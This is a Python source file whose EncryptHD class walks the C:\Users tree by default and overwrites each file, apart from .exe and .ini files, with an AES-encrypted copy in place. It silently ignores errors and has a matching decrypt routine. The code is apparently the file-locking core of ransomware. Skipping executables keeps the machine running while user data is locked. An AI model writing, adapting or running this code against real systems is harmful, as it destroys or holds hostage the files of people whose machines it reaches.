from aes_cipher import AESCipher
import os

EXCLUDE_TYPES = ('.exe', '.ini')

class EncryptHD:
    """the encryption\decryption Hard-Drive routine
    2 properties:
    __parent_dir - root dir to encrypt\decrypt
    __aes_encryption - AESCipher instance for encryption\decryption"""

    def __init__(self, key, parent_dir=r'C:\Users'):
        """get key and root dir to encrypt\decrypt"""
        self.__parent_dir = parent_dir
        self.__aes_encryption = AESCipher(key)

    def get_aes_encryption(self):
        """Getter for AESCipher instance (aes_encryption property) """
        return self.__aes_encryption

    def __read_file(self, filename):
        """read data to given filename"""
        with open(filename, 'rb') as reader:
            return reader.read()

    def __write_file(self, filename, data):
        """write data to given filename"""
        with open(filename, 'wb') as writer:
            writer.write(data)

    def encrypt_hd(self):
        """iterate over parent dir and encrypt the files(include sub-dirs)"""
        for root, dirs, files in os.walk(self.__parent_dir):
            for name in files:
                # if file not in excluded file suffix - encrypt it
                if not name.endswith(EXCLUDE_TYPES):
                    f = os.path.join(root, name)
                    try:
                        data = self.__read_file(f)
                        encrypted_data = self.__aes_encryption.encrypt(data)
                        self.__write_file(f, encrypted_data)
                    except:
                        pass

    def decrypt_hd(self):
        """iterate over parent dir and decrypt the files(include sub-dirs)"""
        for root, dirs, files in os.walk(self.__parent_dir):
            for name in files:
                if not name.endswith(EXCLUDE_TYPES):
                    f = os.path.join(root, name)
                    try:
                        data = self.__read_file(f)
                        decrypt_data = self.__aes_encryption.decrypt(data)
                        self.__write_file(f, decrypt_data)
                    except:
                        pass

